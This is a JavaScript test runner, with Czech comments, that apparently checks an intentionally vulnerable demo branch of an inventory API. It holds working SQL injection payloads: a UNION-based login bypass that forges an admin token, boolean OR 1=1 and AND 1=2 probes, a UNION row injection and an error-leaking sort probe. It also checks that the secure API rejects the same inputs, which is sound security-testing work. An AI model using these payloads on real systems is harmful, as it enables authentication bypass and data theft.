const BASE_URL = process.env.API_BASE_URL || 'http://localhost:4000';

const PAYLOADS = {
  rawLoginUnionAdmin: "' UNION SELECT 1,'demo-union@example.com','demo-pass','Demo Admin','admin' -- ",
  movementTypeBooleanTrue: "IN' OR 1=1 -- ",
  movementTypeBooleanFalse: "IN' AND 1=2 -- ",
  movementTypeUnionRow: "IN' UNION SELECT 999001,1,1,'IN',1,'UNION_ROW',NOW(),'Union User','UNION-SKU','Union Variant' -- ",
  movementSortErrorProbe: 'missing_demo_column',
};

const state = {
  adminToken: null,
  userToken: null,
  forgedAdminToken: null,
  baselineInCount: null,
};

const results = [];

function expect(condition, message) {
  if (!condition) throw new Error(message);
}

function expectStatus(response, expected) {
  expect(
    response.status === expected,
    `Expected HTTP ${expected}, got ${response.status}. Body: ${JSON.stringify(response.body)}`
  );
}

function auth(token) {
  return token ? { Authorization: `Bearer ${token}` } : {};
}

function encode(value) {
  return encodeURIComponent(value);
}

function summarizeBody(body) {
  if (body == null) return null;
  const json = JSON.stringify(body);
  return json.length > 500 ? `${json.slice(0, 500)}...` : json;
}

async function request(method, path, { token, body } = {}) {
  const startedAt = Date.now();
  const headers = {
    ...auth(token),
  };

  const options = { method, headers };
  if (body !== undefined) {
    headers['Content-Type'] = 'application/json';
    options.body = JSON.stringify(body);
  }

  const response = await fetch(`${BASE_URL}${path}`, options);
  const text = await response.text();
  let parsed = null;

  if (text) {
    try {
      parsed = JSON.parse(text);
    } catch (err) {
      parsed = text;
    }
  }

  return {
    method,
    path,
    status: response.status,
    durationMs: Date.now() - startedAt,
    body: parsed,
  };
}

async function test(category, name, fn) {
  try {
    const detail = await fn();
    results.push({
      category,
      name,
      result: 'PASS',
      detail: detail || '',
    });
  } catch (err) {
    results.push({
      category,
      name,
      result: 'FAIL',
      detail: err.message,
    });
  }
}

async function login(email) {
  const res = await request('POST', '/api/auth/login', {
    body: { email, password: 'heslo123' },
  });
  expectStatus(res, 200);
  expect(res.body?.token, `Expected token for ${email}`);
  return res.body.token;
}

function getMovements(body) {
  return Array.isArray(body?.movements) ? body.movements : [];
}

async function main() {
  // Tento runner testuje zamerne zranitelnou demo vetev.
  // PASS u SQLi payloadu znamena, ze demo endpoint ukazal ocekavanou zranitelnost
  // ve vyhrazenem lab prostredi; stejne payloady zaroven porovnavame se secure API.
  await test('setup', 'admin login for demo test context', async () => {
    state.adminToken = await login('admin@example.com');
    return 'admin token ready';
  });

  await test('setup', 'user login for demo test context', async () => {
    state.userToken = await login('user@example.com');
    return 'user token ready';
  });

  await test('demo-boundary', 'GET /api/demo/ping returns 200', async () => {
    const res = await request('GET', '/api/demo/ping');
    expectStatus(res, 200);
    expect(res.body?.ok === true, 'Expected ok=true');
    return `${res.status} in ${res.durationMs}ms`;
  });

  await test('demo-boundary', 'demo movements list without token returns 401', async () => {
    const res = await request('GET', '/api/demo/inventory-movements');
    expectStatus(res, 401);
    return summarizeBody(res.body);
  });

  await test('demo-boundary', 'demo movements list with ordinary user returns 403', async () => {
    const res = await request('GET', '/api/demo/inventory-movements', {
      token: state.userToken,
    });
    expectStatus(res, 403);
    return summarizeBody(res.body);
  });

  await test('demo-boundary', 'demo movements list with admin token returns seeded rows', async () => {
    const res = await request('GET', '/api/demo/inventory-movements?type=IN&limit=100&offset=0', {
      token: state.adminToken,
    });
    expectStatus(res, 200);
    const rows = getMovements(res.body);
    expect(rows.length > 0, 'Expected seeded IN movements');
    expect(rows.every((row) => row.type === 'IN'), 'Expected only IN rows for baseline filter');
    state.baselineInCount = rows.length;
    return `rowCount=${rows.length}`;
  });

  await test('secure-comparison', 'secure auth rejects raw-login UNION payload by email validation', async () => {
    const res = await request('POST', '/api/auth/login', {
      body: { email: PAYLOADS.rawLoginUnionAdmin, password: 'demo-pass' },
    });
    expectStatus(res, 400);
    return summarizeBody(res.body);
  });

  await test('secure-comparison', 'secure movements list rejects type SQLi payload', async () => {
    const res = await request('GET', `/api/inventory-movements?type=${encode(PAYLOADS.movementTypeBooleanTrue)}`, {
      token: state.adminToken,
    });
    expectStatus(res, 400);
    return summarizeBody(res.body);
  });

  await test('raw-login-vuln', 'demo raw-login with real password fails because compare is intentionally naive', async () => {
    const res = await request('POST', '/api/auth/demo/raw-login', {
      body: { email: 'admin@example.com', password: 'heslo123' },
    });
    expectStatus(res, 401);
    return summarizeBody(res.body);
  });

  await test('raw-login-vuln', 'demo raw-login UNION payload forges admin token', async () => {
    const res = await request('POST', '/api/auth/demo/raw-login', {
      body: { email: PAYLOADS.rawLoginUnionAdmin, password: 'demo-pass' },
    });
    expectStatus(res, 200);
    expect(res.body?.token, 'Expected forged token');
    expect(res.body?.user?.email === 'demo-union@example.com', 'Expected UNION-controlled email');
    expect(res.body?.user?.role === 'admin', 'Expected UNION-controlled admin role');
    state.forgedAdminToken = res.body.token;
    return `forgedUser=${res.body.user.email}, role=${res.body.user.role}`;
  });

  await test('raw-login-vuln', 'forged raw-login admin token can access demo admin-only list', async () => {
    const res = await request('GET', '/api/demo/inventory-movements?limit=5', {
      token: state.forgedAdminToken,
    });
    expectStatus(res, 200);
    const rows = getMovements(res.body);
    expect(rows.length > 0, 'Expected accessible rows with forged admin token');
    return `rowCount=${rows.length}`;
  });

  await test('movements-vuln', 'boolean-false payload returns empty row set', async () => {
    const res = await request('GET', `/api/demo/inventory-movements?type=${encode(PAYLOADS.movementTypeBooleanFalse)}&limit=100`, {
      token: state.adminToken,
    });
    expectStatus(res, 200);
    const rows = getMovements(res.body);
    expect(rows.length === 0, `Expected zero rows, got ${rows.length}`);
    return `rowCount=${rows.length}`;
  });

  await test('movements-vuln', 'boolean-true payload expands row set', async () => {
    const res = await request('GET', `/api/demo/inventory-movements?type=${encode(PAYLOADS.movementTypeBooleanTrue)}&limit=100`, {
      token: state.adminToken,
    });
    expectStatus(res, 200);
    const rows = getMovements(res.body);
    expect(rows.length > 0, 'Expected expanded rows');
    expect(rows.length > state.baselineInCount, `Expected more than baseline ${state.baselineInCount}, got ${rows.length}`);
    return `baselineIN=${state.baselineInCount}, expanded=${rows.length}`;
  });

  await test('movements-vuln', 'UNION payload injects synthetic movement row', async () => {
    const res = await request('GET', `/api/demo/inventory-movements?type=${encode(PAYLOADS.movementTypeUnionRow)}&limit=100`, {
      token: state.adminToken,
    });
    expectStatus(res, 200);
    const rows = getMovements(res.body);
    expect(rows.some((row) => row.note === 'UNION_ROW' && row.sku === 'UNION-SKU'),
      `Expected UNION_ROW in response. Body: ${summarizeBody(res.body)}`);
    return `rowCount=${rows.length}, unionRow=true`;
  });

  await test('movements-vuln', 'unsafe sort parameter leaks SQL error detail', async () => {
    const res = await request('GET', `/api/demo/inventory-movements?sort=${encode(PAYLOADS.movementSortErrorProbe)}&dir=ASC`, {
      token: state.adminToken,
    });
    expectStatus(res, 500);
    const body = JSON.stringify(res.body || '');
    expect(body.toLowerCase().includes('unknown column'), `Expected SQL error detail, got ${summarizeBody(res.body)}`);
    return summarizeBody(res.body);
  });

  await test('demo-boundary', 'demo movement create without token returns 401', async () => {
    const res = await request('POST', '/api/demo/inventory-movements', {
      body: { variant_id: 1, type: 'IN', quantity: 1, note: 'Demo boundary no token' },
    });
    expectStatus(res, 401);
    return summarizeBody(res.body);
  });

  await test('demo-boundary', 'demo movement create with ordinary user returns 403', async () => {
    const res = await request('POST', '/api/demo/inventory-movements', {
      token: state.userToken,
      body: { variant_id: 1, type: 'IN', quantity: 1, note: 'Demo boundary user token' },
    });
    expectStatus(res, 403);
    return summarizeBody(res.body);
  });

  await test('demo-boundary', 'demo movement create with admin still uses safe create path', async () => {
    const res = await request('POST', '/api/demo/inventory-movements', {
      token: state.adminToken,
      body: { variant_id: 1, type: 'IN', quantity: 1, note: 'Demo safe create control row' },
    });
    expectStatus(res, 201);
    expect(res.body?.movement?.variant_id === 1, 'Expected movement for variant 1');
    expect(res.body?.movement?.type === 'IN', 'Expected type IN');
    return `movementId=${res.body.movement.id}`;
  });

  const counts = results.reduce((acc, row) => {
    acc[row.result] = (acc[row.result] || 0) + 1;
    return acc;
  }, {});

  console.log(JSON.stringify({
    baseUrl: BASE_URL,
    payloads: PAYLOADS,
    summary: counts,
    results,
  }, null, 2));

  if ((counts.FAIL || 0) > 0) {
    process.exitCode = 1;
  }
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
